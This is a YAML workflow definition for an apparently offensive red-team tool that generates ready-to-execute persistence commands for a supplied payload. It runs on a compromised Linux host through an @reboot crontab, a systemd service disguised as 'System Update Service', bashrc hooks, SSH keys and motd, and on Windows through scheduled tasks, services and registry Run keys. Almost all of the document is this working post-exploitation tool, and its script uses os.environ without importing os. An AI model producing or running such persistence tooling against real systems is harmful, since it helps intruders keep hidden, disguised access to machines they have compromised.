name: persistence-gen
description: |
    Persistence command generator — produce ready-to-execute persistence
    commands for Linux or Windows using ofx.api.persistence.
tags: [redteam, persistence, linux, windows, post-exploitation]
outputs:
    commands_file: "{{ jobs.generate.outputs.commands_file }}"
    command_count: "{{ jobs.generate.outputs.command_count }}"
    methods: "{{ jobs.generate.outputs.methods }}"
dispatch:
    inputs:
        target_os:
            required: true
            type: string
            description: "Target OS: linux or windows"
        method:
            required: true
            type: string
            description: >
                Persistence method — Linux: crontab, service, bashrc, ssh_key, motd.
                Windows: schtask, service, registry.  Use "all" for every method.
        payload_cmd:
            required: true
            type: string
            description: Payload command to persist (e.g. /tmp/beacon, C:\beacon.exe)
        service_name:
            type: string
            default: sysupdate
            description: Service or task name for service/schtask methods

jobs:
    generate:
        name: Generate Persistence Commands
        outputs:
            commands_file: '{{ steps["build-persistence"].outputs.commands_file | default("", true) }}'
            command_count: '{{ steps["build-persistence"].outputs.command_count | default("", true) }}'
            methods: '{{ steps["build-persistence"].outputs.methods | default("", true) }}'
        steps:
            - name: build-persistence
              timeout: 3
              continue-on-error: true
              script: |
                  from ofx.api.persistence import (
                      crontab_command,
                      systemd_user_service,
                      bashrc_persistence,
                      ssh_authorized_key,
                      motd_persistence,
                      schtask_command,
                      service_command,
                      runkey_command,
                  )
                  import json

                  target_os = "{{ inputs.target_os }}".lower()
                  method = "{{ inputs.method }}".lower()
                  payload = "{{ inputs.payload_cmd }}"
                  svc_name = "{{ inputs.service_name }}"

                  commands = {}

                  if target_os == "linux":
                      if method in ("crontab", "all"):
                          commands["crontab"] = crontab_command(payload, schedule="@reboot")

                      if method in ("service", "all"):
                          commands["systemd"] = systemd_user_service(
                              svc_name, payload,
                              description="System Update Service",
                          )

                      if method in ("bashrc", "all"):
                          commands["bashrc"] = bashrc_persistence(payload, profile=True)

                      if method in ("ssh_key", "all"):
                          commands["ssh_key_info"] = [
                              "# Generate key pair first, then install public key:",
                              "ssh-keygen -t ed25519 -f ${OFX_RUN_DIR:-/tmp}/ofx_persist -N ''",
                              "# Then use ssh_authorized_key() with the public key",
                          ]

                      if method in ("motd", "all"):
                          commands["motd"] = motd_persistence(payload)

                  elif target_os == "windows":
                      if method in ("schtask", "all"):
                          commands["schtask"] = [schtask_command(svc_name, payload)]

                      if method in ("service", "all"):
                          commands["service"] = [service_command(svc_name, payload)]

                      if method in ("registry", "all"):
                          commands["registry"] = [runkey_command(svc_name, payload)]

                  else:
                      print(f"[-] Unknown target_os: {target_os} (use linux or windows)")
                      raise SystemExit(1)

                  if not commands:
                      print(f"[-] No matching method '{method}' for {target_os}")
                      print("    Linux methods: crontab, service, bashrc, ssh_key, motd, all")
                      print("    Windows methods: schtask, service, registry, all")
                      raise SystemExit(1)

                  out_file = f"{os.environ.get('OFX_RUN_DIR', '/tmp')}/ofx_persistence_{target_os}.sh"
                  with open(out_file, "w") as f:
                      if target_os == "linux":
                          f.write("#!/bin/bash\n")
                      else:
                          f.write("REM Persistence commands\n")
                      f.write(f"# Payload: {payload}\n\n")

                      for name, cmds in commands.items():
                          f.write(f"# --- {name} ---\n")
                          if isinstance(cmds, list):
                              for cmd in cmds:
                                  f.write(f"{cmd}\n")
                          else:
                              f.write(f"{cmds}\n")
                          f.write("\n")

                  total_cmds = sum(
                      len(v) if isinstance(v, list) else 1 for v in commands.values()
                  )

                  print(f"[+] Persistence commands for {target_os} ({method})")
                  print(f"    Payload: {payload}")
                  print(f"    Methods: {', '.join(commands.keys())}")
                  print(f"    Total commands: {total_cmds}")
                  print(f"    Output: {out_file}")

                  print(f"\n--- Commands ---")
                  for name, cmds in commands.items():
                      print(f"\n  [{name}]")
                      if isinstance(cmds, list):
                          for cmd in cmds:
                              print(f"    {cmd}")
                      else:
                          print(f"    {cmds}")

                  add_outputs(commands_file=out_file, command_count=total_cmds, methods=json.dumps(list(commands.keys())))
              log-stdout: true
              log-command: true
